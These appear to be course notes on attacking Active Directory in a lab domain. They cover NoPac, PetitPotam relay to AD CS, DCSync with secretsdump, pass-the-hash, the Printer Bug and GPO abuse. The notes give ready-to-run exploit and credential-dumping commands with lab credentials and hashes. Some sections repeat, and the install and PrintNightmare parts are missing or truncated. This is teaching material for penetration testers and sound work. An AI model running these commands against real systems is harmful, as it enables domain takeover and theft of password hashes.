# Vulnerabilities
## NoPac (SamAccountName Spoofing)
This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:


we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

**Scanning for NoPac**
```
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

**Running NoPac & Getting a Shell**
```
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.

**Using noPac to DCSync the Built-in Administrator Account**
```
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```


## PrintNightmare
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.

## PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoftâ€™s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

```
$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Running PetitPotam.py
```
$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
```

Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

### Requesting a TGT Using gettgtpkinit.py
Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```
$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```
$ export KRB5CCNAME=dc01.ccache
```

### Using Domain Controller TGT to DCSync
We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
```
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Confirming Admin Access to the Domain Controller
Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```
$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

# Miscellaneous Misconfigurations

## PrivExchange
The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug
The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

## Exchange Related Group Membership
A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

The Exchange group Organization Management is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.


## Enumerating DNS Records
We can use a tool such as adidnsdump [https://github.com/dirkjanm/adidnsdump] to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post.

On the first run of the tool, we can see that some records are blank, namely ?,LOGISTICS,?.

```
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

```
$ head records.csv
```

## Password in Description Field
Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

### Finding Passwords in the Description Field using Get-Domain User
```
PS > Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

## PASSWD_NOTREQD Field
It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins donâ€™t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.

### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```
PS > Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Group Policy Object (GPO) Abuse
Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions
- We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use group3r, ADRecon, PingCastle, among others, to audit the security of GPOs in a domain.

Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.

### Enumerating GPO Names with PowerView
```
PS > Get-DomainGPO |select displayname
```

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.

### Enumerating GPO Names with a Built-In Cmdlet
```
PS > Get-GPO -All | Select DisplayName
```

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts).

### Enumerating GPO Names with a Built-In Cmdlet
```
PS > Get-GPO -All | Select DisplayName
```

Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

### Enumerating Domain User GPO Rights
```
PS > $sid=Convert-NameToSid "Domain Users"
PS > Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.

### Converting GPO GUID to Name
```
PS > Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
